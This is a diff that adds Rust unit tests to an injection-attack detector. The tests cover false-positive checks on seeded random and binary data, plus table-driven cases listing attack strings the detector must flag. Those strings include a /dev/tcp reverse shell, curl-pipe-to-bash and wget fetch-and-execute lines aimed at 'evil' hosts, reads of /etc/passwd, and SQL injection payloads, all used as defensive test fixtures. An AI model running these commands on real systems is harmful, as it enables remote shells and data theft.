@@ -5188,4 +5188,198 @@ mod tests {
             "rce_ast.reverse_shell"
         );
     }
+
+    // ── Blind-negative corpus: seeded-random + binary payloads ───────────────
+    //
+    // codex P1b/P1c backlog: the blind-negative corpus lacked (a) fixed-seed
+    // random data and (b) binary payloads. These prove the default-on detectors —
+    // including the deser base64/blind-decode surface — do NOT false-fire on
+    // non-text / high-entropy content. A tiny inline `xorshift64` keeps the corpus
+    // deterministic (fixed seed → byte-for-byte reproducible across platforms and
+    // runs) with **no** new dependency and no reliance on `rand`'s algorithm
+    // stability.
+
+    /// Deterministic, dependency-free PRNG (xorshift64). Fixed seed ⇒ the corpus
+    /// is identical on every machine and every run, so a regression is reproducible.
+    struct Xorshift64(u64);
+
+    impl Xorshift64 {
+        fn new(seed: u64) -> Self {
+            // xorshift64 is degenerate at 0; a fixed non-zero seed keeps it stable.
+            Self(if seed == 0 { 0x9E37_79B9_7F4A_7C15 } else { seed })
+        }
+        fn next_u64(&mut self) -> u64 {
+            let mut x = self.0;
+            x ^= x << 13;
+            x ^= x >> 7;
+            x ^= x << 17;
+            self.0 = x;
+            x
+        }
+        fn pick(&mut self, from: &[u8]) -> u8 {
+            let idx = usize::try_from(self.next_u64() % from.len() as u64).unwrap_or(0);
+            from.get(idx).copied().unwrap_or(b'a')
+        }
+        /// Length in `lo..=hi`.
+        fn len_in(&mut self, lo: usize, hi: usize) -> usize {
+            lo + usize::try_from(self.next_u64() % (hi - lo + 1) as u64).unwrap_or(0)
+        }
+        /// A single uniformly-random byte (full 0..=255 range).
+        fn next_byte(&mut self) -> u8 {
+            u8::try_from(self.next_u64() & 0xff).unwrap_or(0)
+        }
+    }
+
+    /// Every default-on detector must stay silent on this input.
+    fn assert_corpus_clean(text: &str, kind: &str) {
+        // Structural families (all default-on rule sets).
+        assert!(fire(text).is_none(), "{kind}: SQL structural fired on {text:?}");
+        assert!(rce_fire(text).is_none(), "{kind}: RCE structural fired on {text:?}");
+        assert!(trav_fire(text).is_none(), "{kind}: traversal fired on {text:?}");
+        assert!(xxe_fire(text).is_none(), "{kind}: XXE fired on {text:?}");
+        assert!(nosql_fire(text).is_none(), "{kind}: NoSQL fired on {text:?}");
+        assert!(ssti_fire(text).is_none(), "{kind}: SSTI fired on {text:?}");
+        assert!(ldap_fire(text).is_none(), "{kind}: LDAP fired on {text:?}");
+        assert!(xpath_fire(text).is_none(), "{kind}: XPath fired on {text:?}");
+        assert!(
+            deser_fire(text).is_none(),
+            "{kind}: deser (blind-decode) fired on {text:?}"
+        );
+        // AST pipelines (SQL + shell) — random/binary must never parse into an
+        // injection structure.
+        assert!(ast_fire(text).is_none(), "{kind}: SQL AST fired on {text:?}");
+        assert!(rce_ast_fire(text).is_none(), "{kind}: RCE AST fired on {text:?}");
+    }
+
+    #[test]
+    fn blind_negative_seeded_random_alphanumeric_does_not_fire() {
+        const ALNUM: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        let mut rng = Xorshift64::new(0x0BAD_C0DE_F00D_1234);
+        for _ in 0..256 {
+            let n = rng.len_in(8, 64);
+            let s: String = (0..n).map(|_| char::from(rng.pick(ALNUM))).collect();
+            assert_corpus_clean(&s, "seeded-random-alnum");
+        }
+    }
+
+    #[test]
+    fn blind_negative_seeded_random_base64_does_not_fire() {
+        // Targets the deser base64 / blind-decode surface specifically: a stream of
+        // random base64-alphabet bytes must not collide with any magic gadget token.
+        const B64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        let mut rng = Xorshift64::new(0xD15E_A5ED_1357_9BDF);
+        for _ in 0..256 {
+            let n = rng.len_in(16, 128);
+            let s: String = (0..n).map(|_| char::from(rng.pick(B64))).collect();
+            assert_corpus_clean(&s, "seeded-random-base64");
+        }
+    }
+
+    #[test]
+    fn blind_negative_binary_payloads_do_not_fire() {
+        // Full-range random bytes mapped to Latin-1 chars — control codes, NULs and
+        // high bytes — i.e. non-text binary content. No detector may false-fire.
+        let mut rng = Xorshift64::new(0xFEED_FACE_CAFE_BEEF);
+        for _ in 0..256 {
+            let n = rng.len_in(16, 96);
+            let s: String = (0..n).map(|_| char::from(rng.next_byte())).collect();
+            assert_corpus_clean(&s, "binary");
+        }
+    }
+
+    // ── Table-driven detector skeletons (shell + AST pipelines) ──────────────
+    //
+    // codex/Claude backlog: the shell (RCE) detector and the AST pipeline lacked a
+    // table-driven skeleton. Each row is `(input, Some(expected_rule_key) | None)`
+    // so new cases are one line and the hit/no-hit contract is explicit. Live-PG
+    // `suffix`-sentinel coverage stays a separate `#[ignore]` item (no Postgres in
+    // the unit environment).
+
+    #[test]
+    fn rce_structural_table_driven() {
+        // Default-on RCE structural detector: representative hits + clean rows.
+        let cases: &[(&str, Option<&str>)] = &[
+            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Some("rce.reverse_shell")),
+            ("q=$(whoami)", Some("rce.cmd_subst")),
+            ("sh -c 'id'", Some("rce.shell_exec_flag")),
+            ("python3 -c 'import os'", Some("rce.shell_exec_flag")),
+            ("curl http://evil/x | bash", Some("rce.piped_shell")),
+            ("; wget http://evil.example/x.sh", Some("rce.fetch_exec")),
+            ("cat /etc/passwd", Some("rce.sensitive_read")),
+            ("head /proc/self/environ", Some("rce.sensitive_read")),
+            // clean rows (must NOT fire on the default-on set)
+            ("price sort order asc", None),
+            ("method=curl&url=x", None),
+            ("`whoami`", None), // backtick form is default-off
+            ("; ls -la", None), // cmd_sep_common is default-off
+            (r#"{"cmd":"list","args":["a","b"]}"#, None),
+        ];
+        for (input, expected) in cases {
+            let got = rce_fire(input);
+            match expected {
+                Some(key) => {
+                    let f = got.unwrap_or_else(|| panic!("RCE row {input:?} expected {key}, got no hit"));
+                    assert_eq!(f.rule_key, *key, "RCE row {input:?}");
+                    assert_eq!(f.attack, AttackKind::Rce, "RCE row {input:?} attack kind");
+                }
+                None => assert!(got.is_none(), "RCE row {input:?} expected no hit, got {got:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn ast_sql_table_driven() {
+        // AST SQL pipeline: statement-level structures + clean scalars.
+        let cases: &[(&str, Option<&str>)] = &[
+            ("1 union select null,null,null from users", Some("ast.union")),
+            ("1;drop table x", Some("ast.stacked")),
+            ("1' or '1'='1", Some("ast.tautology")),
+            ("1 or 1=1", Some("ast.tautology")),
+            ("1/**/or/**/1=1", Some("ast.comment_obfusc")),
+            ("1 and sleep(5)", Some("ast.dangerous_fn")),
+            ("1 = (select password from users limit 1)", Some("ast.subquery")),
+            // clean scalars / prose must not parse into an injection structure
+            ("42", None),
+            ("alice", None),
+            ("laptop", None),
+            ("true", None),
+        ];
+        for (input, expected) in cases {
+            let got = ast_fire(input);
+            match expected {
+                Some(key) => {
+                    let f = got.unwrap_or_else(|| panic!("AST row {input:?} expected {key}, got no hit"));
+                    assert_eq!(f.rule_key, *key, "AST row {input:?}");
+                    assert_eq!(f.attack, AttackKind::SqlInjection, "AST row {input:?} attack kind");
+                }
+                None => assert!(got.is_none(), "AST row {input:?} expected no hit, got {got:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn rce_ast_table_driven() {
+        // Shell AST pipeline: interpreter/exec structures + clean rows.
+        let cases: &[(&str, Option<&str>)] = &[
+            ("bash -c id", Some("rce_ast.interp_exec_flag")),
+            ("bash <<EOF\nid\ncat /etc/passwd\nEOF\n", Some("rce_ast.heredoc_interp")),
+            ("echo $(id)", Some("rce_ast.cmd_subst")),
+            ("echo `whoami`", Some("rce_ast.cmd_subst")),
+            ("curl http://evil/x | bash", Some("rce_ast.pipe_to_interp")),
+            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Some("rce_ast.reverse_shell")),
+            // clean rows
+            ("echo hello world", None),
+            ("ls", None),
+        ];
+        for (input, expected) in cases {
+            let got = rce_ast_fire(input);
+            match expected {
+                Some(key) => {
+                    let f = got.unwrap_or_else(|| panic!("RCE-AST row {input:?} expected {key}, got no hit"));
+                    assert_eq!(f.rule_key, *key, "RCE-AST row {input:?}");
+                }
+                None => assert!(got.is_none(), "RCE-AST row {input:?} expected no hit, got {got:?}"),
+            }
+        }
+    }
 }
